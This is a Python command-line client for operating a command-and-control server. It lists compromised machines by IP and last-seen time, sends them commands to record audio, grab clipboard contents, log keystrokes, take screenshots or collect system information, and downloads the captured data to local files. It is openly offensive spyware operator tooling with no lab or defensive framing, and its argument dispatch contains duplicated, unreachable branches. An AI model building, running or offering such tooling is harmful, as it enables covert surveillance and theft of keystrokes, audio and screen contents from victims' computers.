#!/usr/bin/env python3
"""
C2 Server Command-Line Interface
Interactive tool to manage the C2 server and connected clients
"""

import requests
import json
import argparse
import sys
import base64
import os
from tabulate import tabulate
from datetime import datetime

class C2CLI:
    def __init__(self, server_url):
        """Initialize CLI with server URL"""
        self.server_url = server_url.rstrip('/')
        self.session = requests.Session()
    
    def _request(self, method, endpoint, **kwargs):
        """Make HTTP request to server"""
        try:
            url = f"{self.server_url}{endpoint}"
            response = self.session.request(method, url, **kwargs)
            response.raise_for_status()
            return response
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {str(e)}")
            return None
    
    def list_clients(self):
        """List all registered clients"""
        response = self._request('GET', '/api/clients')
        if not response:
            return
        
        data = response.json()
        clients = data.get('clients', {})
        
        if not clients:
            print("[*] No clients registered")
            return
        
        print(f"\n[+] Registered Clients ({len(clients)}):\n")
        
        table_data = []
        for client_id, info in clients.items():
            table_data.append([
                client_id,
                info.get('ip', 'N/A'),
                info.get('status', 'N/A'),
                info.get('registered_at', 'N/A')[:19],
                info.get('last_seen', 'N/A')[:19]
            ])
        
        print(tabulate(table_data, headers=['Client ID', 'IP', 'Status', 'Registered', 'Last Seen']))
    
    def list_results(self, limit=50):
        """List execution results"""
        response = self._request('GET', f'/api/results?limit={limit}')
        if not response:
            return
        
        data = response.json()
        results = data.get('results', [])
        
        print(f"\n[+] Execution Results ({len(results)}):\n")
        
        if not results:
            print("[*] No results available")
            return
        
        table_data = []
        for result in results:
            cap_id = result.get('capability', 'N/A')
            capabilities = {
                0: 'Idle', 1: 'Audio', 2: 'Clipboard',
                3: 'Keylog', 4: 'Screenshot', 5: 'Info'
            }
            cap_name = capabilities.get(cap_id, 'Unknown')
            
            table_data.append([
                result.get('client', 'N/A')[:20],
                cap_id,
                cap_name,
                result.get('result', 'N/A')[:40],
                result.get('timestamp', 'N/A')[:19]
            ])
        
        print(tabulate(table_data, headers=['Client', 'Cap ID', 'Capability', 'Result', 'Timestamp']))
    
    def send_command(self, client_id, capability_id):
        """Send command to a client"""
        payload = {
            "client_id": client_id,
            "capability_id": capability_id
        }
        
        response = self._request('POST', '/api/send_command', json=payload)
        if not response:
            return
        
        result = response.json()
        if result.get('status') == 'success':
            print(f"[+] {result.get('message')}")
        else:
            print(f"[-] {result.get('message')}")
    
    def get_client_info(self, client_id):
        """Get information about a specific client"""
        response = self._request('GET', f'/api/client/{client_id}')
        if not response:
            return
        
        data = response.json()
        if data.get('status') != 'success':
            print(f"[-] {data.get('message')}")
            return
        
        client = data.get('client', {})
        pending = data.get('pending_command', 0)
        
        print(f"\n[+] Client Information: {client_id}\n")
        print(f"    IP Address:      {client.get('ip', 'N/A')}")
        print(f"    Status:          {client.get('status', 'N/A')}")
        print(f"    Registered:      {client.get('registered_at', 'N/A')}")
        print(f"    Last Seen:       {client.get('last_seen', 'N/A')}")
        print(f"    Pending Command: {pending}")
    
    def get_client_results(self, client_id):
        """Get results from a specific client"""
        response = self._request('GET', f'/api/client/{client_id}/results')
        if not response:
            return
        
        data = response.json()
        if data.get('status') != 'success':
            print(f"[-] {data.get('message')}")
            return
        
        results = data.get('results', [])
        print(f"\n[+] Results for {client_id} ({len(results)}):\n")
        
        if not results:
            print("[*] No results available")
            return
        
        table_data = []
        for result in results:
            cap_id = result.get('capability', 'N/A')
            capabilities = {
                0: 'Idle', 1: 'Audio', 2: 'Clipboard',
                3: 'Keylog', 4: 'Screenshot', 5: 'Info'
            }
            cap_name = capabilities.get(cap_id, 'Unknown')
            
            table_data.append([
                cap_id,
                cap_name,
                result.get('result', 'N/A')[:50],
                result.get('timestamp', 'N/A')[:19]
            ])
        
        print(tabulate(table_data, headers=['Cap ID', 'Capability', 'Result', 'Timestamp']))
    
    def download_result(self, client_id, output_dir='downloads'):
        """Download and save all results from a client"""
        response = self._request('GET', f'/api/client/{client_id}/results')
        if not response:
            return
        
        data = response.json()
        if data.get('status') != 'success':
            print(f"[-] {data.get('message')}")
            return
        
        results = data.get('results', [])
        if not results:
            print("[*] No results to download")
            return
        
        # Create output directory
        os.makedirs(output_dir, exist_ok=True)
        client_dir = os.path.join(output_dir, client_id)
        os.makedirs(client_dir, exist_ok=True)
        
        print(f"\n[+] Downloading {len(results)} results to {client_dir}/\n")
        
        capabilities = {
            1: {'name': 'audio', 'ext': '.wav'},
            2: {'name': 'clipboard', 'ext': '.txt'},
            3: {'name': 'keylog', 'ext': '.txt'},
            4: {'name': 'screenshot', 'ext': '.bmp'},
            5: {'name': 'info', 'ext': '.txt'}
        }
        
        downloaded = 0
        for idx, result in enumerate(results, 1):
            cap_id = result.get('capability')
            result_data = result.get('result', '')
            timestamp = result.get('timestamp', 'unknown')[:19].replace(':', '-')
            
            if cap_id not in capabilities:
                print(f"[*] Skipping result {idx}: Unknown capability {cap_id}")
                continue
            
            cap_info = capabilities[cap_id]
            filename = f"{cap_info['name']}_{timestamp}{cap_info['ext']}"
            filepath = os.path.join(client_dir, filename)
            
            try:
                # Try to decode as base64
                decoded_data = base64.b64decode(result_data)
                
                # Write to file
                with open(filepath, 'wb') as f:
                    f.write(decoded_data)
                
                file_size = len(decoded_data)
                print(f"[+] Saved {filename} ({file_size} bytes)")
                downloaded += 1
                
            except Exception as e:
                # If decoding fails, save as text
                try:
                    with open(filepath, 'w') as f:
                        f.write(result_data)
                    print(f"[+] Saved {filename} (text)")
                    downloaded += 1
                except Exception as e2:
                    print(f"[-] Failed to save result {idx}: {str(e2)}")
        
        print(f"\n[+] Downloaded {downloaded}/{len(results)} files to {client_dir}/")
    
    def server_status(self):
        """Get server status"""
        response = self._request('GET', '/')
        if not response:
            return
        
        data = response.json()
        print(f"\n[+] Server Status:\n")
        print(f"    Name:    {data.get('name', 'N/A')}")
        print(f"    Version: {data.get('version', 'N/A')}")
        print(f"    Status:  {data.get('status', 'N/A')}")
        print(f"    Time:    {data.get('timestamp', 'N/A')}")


def main():
    parser = argparse.ArgumentParser(description='C2 Server CLI')
    parser.add_argument('--server', default='http://localhost:8080', help='C2 server URL')
    parser.add_argument('--status', action='store_true', help='Show server status')
    parser.add_argument('--list-clients', action='store_true', help='List all clients')
    parser.add_argument('--list-results', action='store_true', help='List results')
    parser.add_argument('--results-limit', type=int, default=50, help='Limit results display')
    parser.add_argument('--client-info', help='Get info about specific client')
    parser.add_argument('--client-results', help='Get results from specific client')
    parser.add_argument('--send-command', nargs=2, metavar=('CLIENT_ID', 'CAPABILITY_ID'), help='Send command to client')
    parser.add_argument('--download', help='Download all results from specific client')
    parser.add_argument('--output-dir', default='downloads', help='Output directory for downloads (default: downloads)')
    
    args = parser.parse_args()
    
    cli = C2CLI(args.server)
    
    if args.status:
        cli.server_status()
    elif args.list_clients:
        cli.list_clients()
    elif args.list_results:
        cli.list_results(args.results_limit)
    elif args.client_info:
        cli.get_client_info(args.client_info)
    elif args.client_results:
        cli.get_client_results(args.client_results)
    elif args.send_command:
        try:
            client_id, capability_id = args.send_command
            cli.send_command(client_id, int(capability_id))
        except ValueError:
            print("[-] Capability ID must be an integer")
    elif args.client_info:
        cli.get_client_info(args.client_info)
    elif args.client_results:
        cli.get_client_results(args.client_results)
    elif args.download:
        cli.download_result(args.download, args.output_dir)
    elif args.send_command:
        client_id, cap_id = args.send_command
        try:
            cap_id = int(cap_id)
            cli.send_command(client_id, cap_id)
        except ValueError:
            print(f"[-] Capability ID must be a number")
            sys.exit(1)
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
